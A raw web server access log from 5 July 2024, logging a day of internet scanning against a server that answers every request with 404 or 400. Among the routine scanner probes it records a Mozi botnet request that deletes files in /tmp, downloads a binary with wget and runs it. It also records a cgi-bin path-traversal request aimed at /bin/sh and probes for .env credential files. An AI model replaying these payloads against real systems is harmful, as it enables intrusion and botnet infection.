172.104.131.24 - - [05/Jul/2024:05:57:37 +0000] "GET /ews/autodiscovers/ HTTP/1.1" 404 122 "-" "Mozilla/5.0 zgrab/0.x"
172.104.131.24 - - [05/Jul/2024:05:57:38 +0000] "GET /autodiscove/ HTTP/1.1" 404 122 "-" "Mozilla/5.0 zgrab/0.x"
172.104.131.24 - - [05/Jul/2024:05:57:38 +0000] "GET /autodiscover/ HTTP/1.1" 404 122 "-" "Mozilla/5.0 zgrab/0.x"
172.104.131.24 - - [05/Jul/2024:05:57:38 +0000] "GET /autodiscover/autodiscover/ HTTP/1.1" 404 122 "-" "Mozilla/5.0 zgrab/0.x"
172.104.131.24 - - [05/Jul/2024:05:57:39 +0000] "GET /autodiscover/autodiscovers/ HTTP/1.1" 404 122 "-" "Mozilla/5.0 zgrab/0.x"
172.18.0.1 - - [05/Jul/2024:06:00:45 +0000] "GET /git/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [05/Jul/2024:06:00:46 +0000] "GET /git/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [05/Jul/2024:06:00:48 +0000] "GET /git/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [05/Jul/2024:06:00:50 +0000] "GET /git/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [05/Jul/2024:06:00:50 +0000] "GET /git/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [05/Jul/2024:06:00:50 +0000] "GET /git/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [05/Jul/2024:06:00:51 +0000] "GET /git/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [05/Jul/2024:06:00:53 +0000] "GET /git HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [05/Jul/2024:06:00:54 +0000] "GET /git HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [05/Jul/2024:06:00:55 +0000] "GET /git HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [05/Jul/2024:06:00:55 +0000] "GET /git HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [05/Jul/2024:06:00:56 +0000] "GET /git HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [05/Jul/2024:06:00:56 +0000] "GET /git HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [05/Jul/2024:06:01:01 +0000] "GET /git/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
192.155.90.118 - - [05/Jul/2024:06:01:35 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\x84\xC4\xF1G,@u\xBDOP\x04\x8C\x9B\x93\x83\xE9\xCB\x05x\x07\x18\xD9\xB3}T:Q\x81\x08Z\x1E\xD4\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
141.98.83.197 - - [05/Jul/2024:06:10:49 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
27.43.205.79 - - [05/Jul/2024:06:15:39 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 150 "-" "Hello, world"
139.162.251.185 - - [05/Jul/2024:06:46:49 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
139.162.251.185 - - [05/Jul/2024:06:46:50 +0000] "\x16\x03\x01\x00\xFC\x01\x00\x00\xF8\x03\x030\xE2\x89\x8Ar\xA9!\xF3" 400 154 "-" "-"
139.162.251.185 - - [05/Jul/2024:06:46:50 +0000] "\x16\x03\x01\x00\xFC\x01\x00\x00\xF8\x03\x03y41\xE6\x95\x00\xFA\xE8\xC4\xE21\x5C\xC0\xA1'\x99\xBB\x96\x80\xAF\xAF\x00\x9B\xF9\xFE\x8E\x05\x81\xB8qkE \xD4~" 400 154 "-" "-"
139.162.251.185 - - [05/Jul/2024:06:46:50 +0000] "\x16\x03\x01\x00\xFC\x01\x00\x00\xF8\x03\x03\xB4\xED\xF1\xAAm\xE4Y)o\x1F\xB5\xA3\xD3\x03SEg|\xBA\x9E\xC8`\xC7\x95\x86\xF3\x00\x08\xA7\x85\x5CU \xA61\xC8\xD4\x1EH\x02\x0F\xAF\xD8\x94\xAC\xF4\x1C\x169\xF2o\xAA9O\x8D\xBE~\x9F\x91\x9Ez\xFDxcr\x00$\x13\x02\x13\x03\x13\x01\xC0,\xC00\xC0+\xC0/\xCC\xA9\xCC\xA8\xC0$\xC0(\xC0#\xC0'\x00\x9F\x00\x9E\x00k\x00g\x00\xFF\x01\x00\x00\x8B\x00\x0B\x00\x04\x03\x00\x01\x02\x00" 400 154 "-" "-"
57.129.23.166 - - [05/Jul/2024:07:35:17 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [05/Jul/2024:07:35:17 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
167.94.145.108 - - [05/Jul/2024:07:53:05 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
167.94.145.108 - - [05/Jul/2024:07:53:14 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.108 - - [05/Jul/2024:07:53:15 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
172.105.128.13 - - [05/Jul/2024:07:56:17 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03P5\xFEw\xF9\xFC\x93?\x15\x90\xAA\xECH#\x16\xF83\x9D\x09\xB7%\x83\xDD\xCA\xB0\xDF\x8Du\x118\xE9\xBA\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
57.129.23.166 - - [05/Jul/2024:08:26:32 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [05/Jul/2024:08:26:32 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
141.98.83.197 - - [05/Jul/2024:08:45:36 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.156.129.56 - - [05/Jul/2024:09:09:24 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.150.26.246 - - [05/Jul/2024:09:09:27 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
185.224.128.43 - - [05/Jul/2024:09:11:17 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
27.222.11.186 - - [05/Jul/2024:09:14:01 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 154 "-" "-"
4.151.38.180 - - [05/Jul/2024:09:44:06 +0000] "GET /actuator/health HTTP/1.1" 404 122 "-" "Mozilla/5.0 zgrab/0.x"
141.98.83.197 - - [05/Jul/2024:09:46:01 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
57.129.23.166 - - [05/Jul/2024:09:48:33 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [05/Jul/2024:09:48:33 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.104.114.233 - - [05/Jul/2024:09:50:48 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
143.110.181.249 - - [05/Jul/2024:09:50:51 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
80.66.76.121 - - [05/Jul/2024:09:54:27 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 154 "-" "-"
57.129.23.166 - - [05/Jul/2024:10:26:59 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [05/Jul/2024:10:27:00 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.150.26.251 - - [05/Jul/2024:10:31:07 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
141.98.83.197 - - [05/Jul/2024:10:31:48 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
157.230.37.129 - - [05/Jul/2024:10:45:55 +0000] "GET /cdn-cgi/trace HTTP/1.1" 404 122 "-" "Mozilla/5.0"
157.230.37.129 - - [05/Jul/2024:10:46:48 +0000] "\x16\x03\x01\x01\x07\x01\x00\x01\x03\x03\x03;\xFE\x88ef+\xB3\xAB\x9C\xE1\xAF@\x0F\xB0\xEF\x0Fe\xF6\x9D\x86_x\xCC\xD1\x00\x99b\x1Fc\x90\xD9\xBA \x87j\xE7\x06\xCEj\xF3\xE9\x1C\x89\xCF\xC4\x91<\xC5:\x11\x7F\xD3\xF3\x85\xDCd\x16\x11\x1Fs\xAF\xA2\x1ElP\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 154 "-" "-"
189.14.51.251 - - [05/Jul/2024:10:51:23 +0000] "GET / HTTP/1.1" 404 552 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
92.249.48.202 - - [05/Jul/2024:10:55:31 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
57.129.23.166 - - [05/Jul/2024:11:13:29 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [05/Jul/2024:11:13:29 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
141.98.83.197 - - [05/Jul/2024:11:35:00 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.79.181.179 - - [05/Jul/2024:11:59:17 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\xD6ir\xE7\xAB\xF5w\x89\xFE\xE4\xF8\xE4's\x03\xBEj\xEE\xCDear\x18\x1F\xA5\xF7\xF7\x03\xDF\xA9K\xE7\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
184.105.247.194 - - [05/Jul/2024:12:01:42 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xE9\x88\xBEI]\xC9\xC2\xE4\x84\x05w" 400 154 "-" "-"
106.75.17.42 - - [05/Jul/2024:12:03:32 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
141.98.83.197 - - [05/Jul/2024:12:34:45 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 122 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
165.227.224.174 - - [05/Jul/2024:12:44:48 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xF4\xDD\xA2^`\xF1S\xECV\xA7\xB8\xC2\x5C\xD4p\x03\xF7\x0C\x22\xCDdu\xAB3\x8C\x83\x9E\x14\x84@\x9C\x06\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
165.227.224.174 - - [05/Jul/2024:12:44:48 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03W\x0F\xED\x1B\x03\xB1\x9C\xBA\x1Aa\xE0\x22)Yf\x84\xC6n\xB3\xD2\xEE\xA8\xB9\xA7\x99\xD8\xB8\xF6X\xA4\xC3\x0B\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
165.227.224.174 - - [05/Jul/2024:12:44:48 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
165.227.224.174 - - [05/Jul/2024:12:44:48 +0000] "GET /form.html HTTP/1.1" 404 122 "-" "curl/8.1.2"
165.227.224.174 - - [05/Jul/2024:12:44:49 +0000] "GET /upl.php HTTP/1.1" 404 122 "-" "Mozilla/5.0"
165.227.224.174 - - [05/Jul/2024:12:44:49 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x036c\x1FP\xA9\x0C\xD7\x17\xF2\x0E\xD9\xFF\xEFd\x8C,4|\x01\x98\x92\xE24\xBB\x9C\xA5\xF7\xCB\x00\xAF\xB8\x9A\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
165.227.224.174 - - [05/Jul/2024:12:44:49 +0000] "GET /geoip/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
165.227.224.174 - - [05/Jul/2024:12:44:49 +0000] "GET /favicon.ico HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
165.227.224.174 - - [05/Jul/2024:12:44:50 +0000] "GET /1.php HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
165.227.224.174 - - [05/Jul/2024:12:44:50 +0000] "GET /bundle.js HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
165.227.224.174 - - [05/Jul/2024:12:44:50 +0000] "GET /files/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
165.227.224.174 - - [05/Jul/2024:12:44:51 +0000] "GET /systembc/password.php HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
165.227.224.174 - - [05/Jul/2024:12:44:51 +0000] "GET /password.php HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
165.227.224.174 - - [05/Jul/2024:12:44:51 +0000] "GET /info.php HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
13.83.41.98 - - [05/Jul/2024:13:06:59 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 zgrab/0.x"
65.49.20.66 - - [05/Jul/2024:13:13:59 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
65.49.20.66 - - [05/Jul/2024:13:15:35 +0000] "GET /webui/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
65.49.20.66 - - [05/Jul/2024:13:16:25 +0000] "GET /favicon.ico HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"
65.49.20.66 - - [05/Jul/2024:13:16:58 +0000] "GET /geoserver/web/ HTTP/1.1" 404 122 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
141.98.83.197 - - [05/Jul/2024:13:33:22 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
44.225.174.208 - - [05/Jul/2024:13:34:31 +0000] "GET / HTTP/1.1" 404 150 "-" "WizDynamicScanner/1.0"
44.225.174.208 - - [05/Jul/2024:13:34:31 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.126 Safari/537.36"
185.191.126.213 - - [05/Jul/2024:13:36:38 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
206.168.34.216 - - [05/Jul/2024:13:41:05 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
206.168.34.216 - - [05/Jul/2024:13:41:15 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.216 - - [05/Jul/2024:13:41:15 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
94.156.68.162 - - [05/Jul/2024:13:53:45 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36 OPR/20.0.1387.91"
94.156.68.162 - - [05/Jul/2024:13:55:59 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3887.7 Safari/537.36"
185.224.128.43 - - [05/Jul/2024:14:05:35 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
62.210.90.217 - - [05/Jul/2024:14:27:18 +0000] "HEAD / HTTP/1.1" 404 0 "-" "curl/7.81.0"
62.210.90.217 - - [05/Jul/2024:14:27:21 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.3"
62.210.90.217 - - [05/Jul/2024:14:27:21 +0000] "GET /favicon.ico HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.3"
62.210.90.217 - - [05/Jul/2024:14:27:22 +0000] "GET /ads.txt HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.3"
62.210.90.217 - - [05/Jul/2024:14:27:22 +0000] "GET /app-ads.txt HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.3"
62.210.90.217 - - [05/Jul/2024:14:27:22 +0000] "GET /sellers.json HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.3"
54.36.115.221 - - [05/Jul/2024:14:40:19 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.36.115.221 - - [05/Jul/2024:14:40:19 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.191.198.58 - - [05/Jul/2024:14:49:50 +0000] "\x00\x00\x00P\x00\x03\x00\x00user\x00nuclei\x00database\x00nuclei\x00application_name\x00psql\x00client_encoding\x00UTF8\x00\x00p\x00\x00\x006SCRAM-SHA-256\x00\x00\x00\x00 n,,n=,r=\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 154 "-" "-"
54.191.198.58 - - [05/Jul/2024:14:49:50 +0000] "GET / HTTP/1.1" 404 150 "-" "WizDynamicScanner/1.0"
54.191.198.58 - - [05/Jul/2024:14:49:50 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.126 Safari/537.36"
54.191.198.58 - - [05/Jul/2024:14:49:51 +0000] "GET /version HTTP/1.1" 404 122 "-" "Mozilla/5.0 (Windows NT 10.0; rv:56.0) Gecko/20100101 Firefox/56.0"
141.98.83.197 - - [05/Jul/2024:15:35:30 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
54.36.115.221 - - [05/Jul/2024:15:41:10 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.36.115.221 - - [05/Jul/2024:15:41:11 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.155.90.220 - - [05/Jul/2024:16:20:47 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\x08\xAF^\xE7\x8FY\xE1G\x8D\xAE\xBC{\xADQ\xFE\xF0\x0Ce\x1D\x80\x88\xBC\xDD\x0F\x83\x18\x8E\xB8\x85RB\x1F\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
92.249.48.202 - - [05/Jul/2024:16:31:48 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.150.26.246 - - [05/Jul/2024:16:33:31 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
164.90.210.85 - - [05/Jul/2024:17:04:20 +0000] "GET / HTTP/1.0" 404 150 "-" "-"
164.90.210.85 - - [05/Jul/2024:17:04:21 +0000] "GET /odinhttpcall1720199060 HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
164.90.210.85 - - [05/Jul/2024:17:04:21 +0000] "GET / HTTP/1.0" 404 150 "-" "-"
164.90.210.85 - - [05/Jul/2024:17:04:21 +0000] "POST /sdk HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
164.90.210.85 - - [05/Jul/2024:17:04:21 +0000] "GET /HNAP1 HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
164.90.210.85 - - [05/Jul/2024:17:04:21 +0000] "GET /evox/about HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
164.90.210.85 - - [05/Jul/2024:17:04:21 +0000] "GET / HTTP/1.0" 404 150 "-" "-"
164.90.210.85 - - [05/Jul/2024:17:04:22 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
159.89.2.50 - - [05/Jul/2024:17:04:22 +0000] "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
138.197.177.149 - - [05/Jul/2024:17:04:22 +0000] "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
138.68.87.158 - - [05/Jul/2024:17:04:22 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
138.68.87.7 - - [05/Jul/2024:17:04:22 +0000] "GET /solr/admin/info/system HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
164.92.253.213 - - [05/Jul/2024:17:04:22 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03" 400 154 "-" "-"
138.68.87.7 - - [05/Jul/2024:17:04:22 +0000] "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
164.92.253.213 - - [05/Jul/2024:17:04:22 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03[\x15\x15\xA2\x15\x86" 400 154 "-" "-"
178.128.201.103 - - [05/Jul/2024:17:04:23 +0000] "GET /v2/_catalog HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
164.92.253.213 - - [05/Jul/2024:17:04:23 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03Q\xBB\xE5\x83\xDFFr\x0F\x84\x81\xE4\x02\x80j" 400 154 "-" "-"
